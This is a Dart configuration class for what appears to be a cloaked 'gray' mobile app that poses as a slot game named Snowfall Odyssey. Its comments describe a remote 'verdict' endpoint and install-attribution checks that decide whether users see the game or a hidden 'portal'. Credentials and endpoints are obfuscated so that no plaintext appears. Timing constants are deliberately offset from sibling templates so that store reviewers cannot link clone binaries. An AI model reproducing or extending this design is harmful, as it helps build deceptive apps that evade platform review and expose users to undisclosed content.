import 'veiled_slots.dart';

// ============================================================
//  ClientDossier — the one spot where identity + timings live
// ============================================================
//  Store listing identity (app id, display name, store ids) is
//  public, so it stays as plain `const String` here. Every
//  credential, endpoint and UA fragment is loaded lazily through
//  the `*Resolved` getters so no plaintext secret ever appears as
//  a literal.
//
//  Timing constants are deliberately offset from the sibling
//  templates (gray_part_pitfalls.md §19 range table) so release
//  binaries never share magic numbers across Snowfall's siblings.
// ============================================================

abstract final class ClientDossier {
  // --------------------------------------------------
  //  Identity (public — matches Play listing)
  // --------------------------------------------------
  static const String bundle = 'com.snowfallodyssey.odysseygame';
  static const String marketListing = 'com.snowfallodyssey.odysseygame';
  static const String displayName = 'Snowfall Odyssey';
  static const String iosNumericId = '';

  // --------------------------------------------------
  //  Timings — all offset ≥10% from any sibling value
  // --------------------------------------------------
  /// Snooze for the Skip tap on the push-invite card.
  /// Range: 172800..604800. Snowfall uses 2 days 22 hours (252000s).
  static const int permissionSnoozeSeconds =
      2 * 24 * 60 * 60 + 22 * 60 * 60;

  /// Delay before re-polling GCD when the first install payload
  /// reports Organic. Range: 4..12.
  static const int organicRescueDelaySec = 9;

  /// Verdict POST timeout. Range: 10..25.
  static const int verdictTimeoutSec = 21;

  /// First-launch install-conversion wait. Range: 20..40.
  static const int firstInstallWaitSec = 33;

  /// Returning-launch install-conversion wait. Range: 3..10.
  static const int returningInstallWaitSec = 8;

  /// Deep-link callback wait. Range: 3..8.
  static const int deepLinkWaitSec = 5;

  /// DNS probe timeout. Range: 4..9.
  static const int probeTimeoutSec = 8;

  /// Debounce before a sustained connectivity drop routes to the
  /// offline screen. Range: 500..1200 ms.
  static const int dropDebounceMs = 940;

  /// Main-frame redirect-loop retries. Range: 1..5.
  static const int redirectLoopRetries = 3;

  /// Cached verdict URL freshness. Range: 3..14 days.
  static const int cachedUrlLifeSec = 7 * 24 * 60 * 60;

  // --------------------------------------------------
  //  Resolved endpoints + credentials
  // --------------------------------------------------
  static String get verdictEndpoint => unmaskVerdictEndpoint();
  static String get attributionKey => unmaskAttributionKey();
  static String get messagingProject => unmaskMessagingProject();

  /// Store id in the shape the config endpoint expects — iOS
  /// numeric prefixed with `id`, Android bundle verbatim.
  static String get storeTag {
    if (iosNumericId.isNotEmpty) return 'id$iosNumericId';
    return marketListing;
  }

  /// The portal gate stays dormant until all three secrets are
  /// present. On a template checkout this means every install
  /// lands in the native slot game regardless of other state.
  static bool get credentialsReady =>
      verdictEndpoint.isNotEmpty &&
      attributionKey.isNotEmpty &&
      messagingProject.isNotEmpty;
}
